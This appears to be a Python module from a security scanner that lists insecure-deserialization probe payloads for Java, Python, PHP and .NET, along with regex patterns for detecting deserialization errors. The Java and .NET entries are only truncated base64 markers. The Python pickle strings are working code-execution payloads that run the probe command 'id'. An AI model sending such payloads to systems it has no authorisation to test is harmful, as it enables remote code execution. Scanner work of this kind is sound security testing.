"""Insecure Deserialization Payloads.

Provides platform-specific deserialization exploit patterns for
Java, Python, PHP, and .NET applications.
"""

from typing import List

# Java ysoserial-style gadget chain patterns (base64 placeholder patterns)
JAVA_GADGET_CHAINS: List[str] = [
    'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',  # CommonsCollections1 marker
    'rO0ABXNyACBvcmcuc3ByaW5nZnJhbWV3b3Jr',  # Spring1 marker
    'rO0ABXNyAC1vcmcuYXBhY2hlLmNvbW1vbnM=',  # CommonsCollections3 marker
    'rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0',  # JDK7u21 marker
    'rO0ABXNyACRvcmcuYXBhY2hlLndpY2tldC5h',  # Wicket1 marker
    'rO0ABXNyABpvcmcuamJvc3MuaW50ZXJjZXB0',  # JBoss marker
    'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0',  # BeanShell marker
    'rO0ABXNyABxvcmcubW96aWxsYS5qYXZhc2Ny',  # Rhino1 marker
]

# Python pickle exploit patterns
PYTHON_PICKLE_PAYLOADS: List[str] = [
    "cos\\nsystem\\n(S'id'\\ntR.",
    "csubprocess\\ncheck_output\\n(S'id'\\ntR.",
    "c__builtin__\\neval\\n(S'__import__(\"os\").system(\"id\")'\\ntR.",
    "gANjb3MKc3lzdGVtCnEAWAIAAABpZHEBhXECUnEDLg==",  # base64 pickle
    "(S'__import__(\"os\").popen(\"id\").read()'\\ni__builtin__\\neval\\n.",
]

# PHP unserialize injection patterns
PHP_UNSERIALIZE_PAYLOADS: List[str] = [
    'O:8:"stdClass":1:{s:4:"evil";s:2:"id";}',
    'a:1:{s:4:"test";O:8:"stdClass":0:{}}',
    'O:14:"__PHP_Incomplete_Class":1:{s:1:"a";s:2:"id";}',
    'O:3:"PDO":0:{}',
    'O:24:"GuzzleHttp\\Psr7\\Request":0:{}',
]

# .NET BinaryFormatter patterns
DOTNET_PAYLOADS: List[str] = [
    'AAEAAAD/////AQAAAAAAAAAMAgAAAA==',  # BinaryFormatter marker
    'AAEAAAD/////AQAAAAAAAAAEAQAAABl=',  # ObjectStateFormatter marker
    'AAEAAAD/////AQAAAAAAAAAEAQAAAA==',  # ViewState marker
    'AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0u',  # System type marker
    'AAEAAAD/////BQEAAAALQ29uc29sZS5BcHA=',  # Console.App marker
]


def get_deserialization_payloads(platform: str = 'java') -> List[str]:
    """Get deserialization payloads for a specific platform.

    Parameters
    ----------
    platform : str
        Target platform: 'java', 'python', 'php', 'dotnet', or 'all'.

    Returns
    -------
    list[str]
        List of deserialization payload strings.
    """
    platform = platform.lower()
    if platform == 'java':
        return JAVA_GADGET_CHAINS
    elif platform == 'python':
        return PYTHON_PICKLE_PAYLOADS
    elif platform == 'php':
        return PHP_UNSERIALIZE_PAYLOADS
    elif platform == 'dotnet':
        return DOTNET_PAYLOADS
    elif platform == 'all':
        return JAVA_GADGET_CHAINS + PYTHON_PICKLE_PAYLOADS + PHP_UNSERIALIZE_PAYLOADS + DOTNET_PAYLOADS
    else:
        return JAVA_GADGET_CHAINS  # Default to Java


# Detection patterns for response analysis
DESERIALIZATION_ERROR_PATTERNS: List[str] = [
    r'ClassNotFoundException',
    r'java\.io\.ObjectInputStream',
    r'InvalidClassException',
    r'StreamCorruptedException',
    r'pickle\.loads',
    r'UnpicklingError',
    r'unserialize\(\)',
    r'__PHP_Incomplete_Class',
    r'BinaryFormatter',
    r'ObjectStateFormatter',
    r'ViewState.*validation',
    r'TypeInitializationException',
]
